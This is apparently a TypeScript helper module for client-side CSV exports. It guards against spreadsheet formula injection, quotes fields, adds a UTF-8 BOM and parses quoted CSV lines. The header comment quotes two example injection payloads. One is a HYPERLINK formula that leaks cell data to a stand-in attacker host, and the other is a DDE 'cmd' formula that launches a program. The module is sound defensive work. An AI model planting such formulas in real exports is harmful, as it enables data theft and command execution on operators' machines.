/**
 * SCAN-1161 [HIGH]: CSV formula-injection guard for client-side exports.
 *
 * Mirrors the server-side helper (SCAN-1130 in reports.routes.ts). Excel,
 * LibreOffice Calc, and Google Sheets all evaluate any cell whose first
 * character is `=`, `+`, `-`, `@`, tab, or CR as a formula. A value that
 * started life as a customer name, ticket note, device name, SKU, or any
 * other attacker-controllable field could ship a payload like
 * `=HYPERLINK("http://attacker/?" & A1)` or `=cmd|' /C calc'!A0` that
 * runs when an operator opens the CSV locally.
 *
 * Prefix the offender with a single quote — the widely-documented "render
 * as literal" convention every major spreadsheet honours. The quote is
 * stripped during normal view; round-tripping through a parser re-adds
 * it because the cell is already quoted.
 *
 * `toCsvRow(values)` additionally handles the standard CSV quoting rules
 * (double-quote fields with commas/quotes/newlines, escape inner quotes
 * as `""`) so call sites no longer need to reproduce them per export.
 */
const CSV_FORMULA_TRIGGERS = /^[=+\-@\t\r]/;

export function sanitizeCsvCell(value: unknown): string {
  if (value == null) return '';
  const str = String(value);
  return CSV_FORMULA_TRIGGERS.test(str) ? `'${str}` : str;
}

export function toCsvField(value: unknown): string {
  const str = sanitizeCsvCell(value);
  if (str.includes(',') || str.includes('"') || str.includes('\n') || str.includes('\r')) {
    return '"' + str.replace(/"/g, '""') + '"';
  }
  return str;
}

export function toCsvRow(values: readonly unknown[]): string {
  return values.map(toCsvField).join(',');
}

/**
 * UTF-8 BOM for spreadsheet exports.
 *
 * Excel on Windows defaults to the system code page (CP-1252 in most
 * locales) when opening a CSV without a BOM. Accented Latin characters
 * become mojibake, Cyrillic / CJK become `?`. Prepending U+FEFF flips
 * Excel into UTF-8 mode. LibreOffice + Numbers + Google Sheets all
 * tolerate the BOM; modern parsers strip it transparently.
 *
 * Usage: `new Blob([CSV_BOM + csv], { type: 'text/csv;charset=utf-8' })`.
 */
export const CSV_BOM = '﻿';

/**
 * Parse a single CSV line honouring RFC-4180 quoting rules:
 *   - fields wrapped in `"..."` may contain commas
 *   - inner `"` is escaped as `""`
 *   - unquoted fields are taken verbatim
 *
 * Naive `.split(',')` mangles quoted commas (e.g. `"Smith, Jr Inc.",x@y`
 * splits to 3 columns instead of 2). Round-tripping our own export — which
 * properly quotes via `toCsvField` — requires a matching parser.
 *
 * Note: this is a single-line parser. Newlines inside quoted fields are
 * not supported here; if a caller exports such fields, splitting the
 * source text on `\n` already broke the row before this function is
 * invoked. None of our current exports embed newlines, so the trade-off
 * is fine. Strip a leading BOM if present so the first header parses.
 */
export function parseCsvLine(line: string): string[] {
  const out: string[] = [];
  let cur = '';
  let inQuotes = false;
  for (let i = 0; i < line.length; i++) {
    const ch = line[i];
    if (inQuotes) {
      if (ch === '"') {
        if (line[i + 1] === '"') { cur += '"'; i++; }
        else { inQuotes = false; }
      } else {
        cur += ch;
      }
    } else {
      if (ch === '"') {
        inQuotes = true;
      } else if (ch === ',') {
        out.push(cur);
        cur = '';
      } else {
        cur += ch;
      }
    }
  }
  out.push(cur);
  // Strip BOM from first field if present (when caller forgot to slice it).
  if (out.length > 0 && out[0].charCodeAt(0) === 0xFEFF) {
    out[0] = out[0].slice(1);
  }
  return out.map(v => v.trim());
}
